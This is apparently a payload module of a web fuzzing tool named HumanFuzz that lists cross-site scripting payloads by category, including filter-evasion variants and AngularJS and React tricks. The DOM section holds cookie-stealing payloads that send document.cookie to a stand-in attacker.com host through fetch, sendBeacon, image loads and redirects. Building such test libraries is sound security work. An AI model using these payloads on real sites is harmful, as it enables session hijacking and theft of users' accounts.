"""
XSS (Cross-Site Scripting) payload module for HumanFuzz.

This module provides a comprehensive collection of XSS payloads for testing web applications.
"""

from typing import List
from humanfuzz.payloads import Payload

def get_payloads(field_type: str = None) -> List[Payload]:
    """
    Get XSS payloads, optionally filtered by field type.

    Args:
        field_type: Type of the field (optional)

    Returns:
        List of Payload objects
    """
    # Basic XSS payloads
    basic_payloads = [
        Payload("<script>alert(1)</script>", "xss", "Basic Script Alert",
                "Basic JavaScript alert in script tags"),
        Payload("<img src=x onerror=alert(1)>", "xss", "Image Error Event",
                "XSS using image error event"),
        Payload("<svg onload=alert(1)>", "xss", "SVG Onload",
                "XSS using SVG onload event"),
        Payload("<div onmouseover=\"alert(1)\">Hover me</div>", "xss", "Mouse Over",
                "XSS triggered by mouse hover"),
        Payload("<a href=\"javascript:alert(1)\">Click me</a>", "xss", "Link JavaScript",
                "XSS in anchor href attribute"),
    ]

    # Advanced XSS payloads
    advanced_payloads = [
        Payload("javascript:alert(1)", "xss", "JavaScript Protocol",
                "Using javascript: protocol"),
        Payload("<iframe src=\"javascript:alert(1)\"></iframe>", "xss", "Iframe JavaScript",
                "XSS using iframe with javascript protocol"),
        Payload("<body onload=alert(1)>", "xss", "Body Onload",
                "XSS using body onload event"),
        Payload("<details open ontoggle=alert(1)>", "xss", "Details Toggle",
                "XSS using details element toggle event"),
        Payload("<select autofocus onfocus=alert(1)>", "xss", "Select Focus",
                "XSS using select element focus event"),
        Payload("<marquee onstart=alert(1)>", "xss", "Marquee Start",
                "XSS using marquee element start event"),
        Payload("<video src=1 onerror=alert(1)>", "xss", "Video Error",
                "XSS using video element error event"),
        Payload("<audio src=1 onerror=alert(1)>", "xss", "Audio Error",
                "XSS using audio element error event"),
    ]

    # Filter evasion payloads
    evasion_payloads = [
        Payload("<script>eval(atob('YWxlcnQoMSk='))</script>", "xss", "Base64 Encoded",
                "Base64 encoded alert to evade filters"),
        Payload("<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"", "xss",
                "Char Code Evasion", "Using character codes to evade filters"),
        Payload("<script>setTimeout('ale'+'rt(1)',0)</script>", "xss", "String Splitting",
                "Splitting strings to evade filters"),
        Payload("<script>\\u0061lert(1)</script>", "xss", "Unicode Escape",
                "Using Unicode escape sequences to evade filters"),
        Payload("<script>a=alert;a(1);</script>", "xss", "Function Assignment",
                "Assigning alert to variable to evade filters"),
        Payload("<script>onerror=alert;throw 1</script>", "xss", "Error Handler",
                "Using error handler to execute alert"),
        Payload("<script>{'ale'+'rt'}(1)</script>", "xss", "Object Property",
                "Using computed object property to evade filters"),
        Payload("<script>window['alert'](1)</script>", "xss", "Window Property",
                "Accessing alert via window object to evade filters"),
        Payload("<script>this['ale'+'rt'](1)</script>", "xss", "This Property",
                "Accessing alert via this object to evade filters"),
    ]

    # DOM-based XSS payloads
    dom_payloads = [
        Payload("\"><script>document.getElementById('test').innerHTML=document.cookie</script>", "xss",
                "DOM Cookie Theft", "Stealing cookies via DOM manipulation"),
        Payload("<a href=\"#\" onclick=\"document.location='https://attacker.com/steal?cookie='+document.cookie\">Click me</a>",
                "xss", "Link Cookie Theft", "Stealing cookies via link click"),
        Payload("<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>", "xss",
                "Fetch Cookie Theft", "Stealing cookies via fetch API"),
        Payload("<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>", "xss",
                "Image Cookie Theft", "Stealing cookies via image loading"),
        Payload("<script>navigator.sendBeacon('https://attacker.com/steal', document.cookie)</script>", "xss",
                "Beacon Cookie Theft", "Stealing cookies via Beacon API"),
        Payload("<script>window.location.href='https://attacker.com/steal?cookie='+document.cookie</script>", "xss",
                "Redirect Cookie Theft", "Stealing cookies via redirect"),
    ]

    # HTML5-specific XSS payloads
    html5_payloads = [
        Payload("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "xss", "SVG Animate",
                "XSS using SVG animate element"),
        Payload("<svg><set onbegin=alert(1) attributeName=x to=y dur=1s>", "xss", "SVG Set",
                "XSS using SVG set element"),
        Payload("<math><maction actiontype=statusline xlink:href='javascript:alert(1)'>Click</maction></math>", "xss",
                "MathML Action", "XSS using MathML maction element"),
        Payload("<form><button formaction=javascript:alert(1)>Click</button>", "xss", "Form Action",
                "XSS using form button formaction attribute"),
        Payload("<input autofocus onfocus=alert(1)>", "xss", "Input Autofocus",
                "XSS using input autofocus attribute"),
        Payload("<video><source onerror=alert(1)>", "xss", "Video Source",
                "XSS using video source element"),
        Payload("<keygen autofocus onfocus=alert(1)>", "xss", "Keygen Focus",
                "XSS using deprecated keygen element"),
    ]

    # AngularJS-specific XSS payloads
    angular_payloads = [
        Payload("{{constructor.constructor('alert(1)')()}}", "xss", "Angular Expression",
                "XSS using AngularJS expression evaluation"),
        Payload("<div ng-app ng-csp><div ng-click=$event.view.alert(1)>Click me</div></div>", "xss",
                "Angular Event", "XSS using AngularJS event handling"),
        Payload("<div ng-app>{{$on.constructor('alert(1)')()}}</div>", "xss", "Angular Constructor",
                "XSS using AngularJS $on.constructor"),
        Payload("<div ng-app>{{$eval.constructor('alert(1)')()}}</div>", "xss", "Angular Eval",
                "XSS using AngularJS $eval.constructor"),
    ]

    # React-specific XSS payloads
    react_payloads = [
        Payload("<div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}></div>", "xss",
                "React Dangerous HTML", "XSS using React's dangerouslySetInnerHTML"),
        Payload("javascript:void(document.getElementById('root').innerHTML='<img src=x onerror=alert(1)>')", "xss",
                "React DOM Manipulation", "XSS by directly manipulating React-controlled DOM"),
    ]

    # Combine all payloads
    all_payloads = (basic_payloads + advanced_payloads + evasion_payloads + dom_payloads +
                    html5_payloads + angular_payloads + react_payloads)

    # Filter by field type if specified
    if field_type:
        if field_type in ["hidden", "password", "file", "number"]:
            # These field types are less likely to be vulnerable to XSS
            return basic_payloads
        elif field_type in ["url", "search"]:
            # URL fields might be more susceptible to certain payloads
            return [p for p in all_payloads if "javascript:" in p.value or "location" in p.value]
        elif field_type == "textarea":
            # Textarea can often handle more complex payloads
            return basic_payloads + advanced_payloads + html5_payloads
        elif field_type == "email":
            # Email fields often have special validation
            return [
                Payload("\"onmouseover=alert(1)>", "xss", "Email Quote Break",
                        "Breaking out of email field quotes"),
                Payload("javascript:alert(1)", "xss", "Email JavaScript",
                        "JavaScript protocol in email field"),
            ]

    return all_payloads
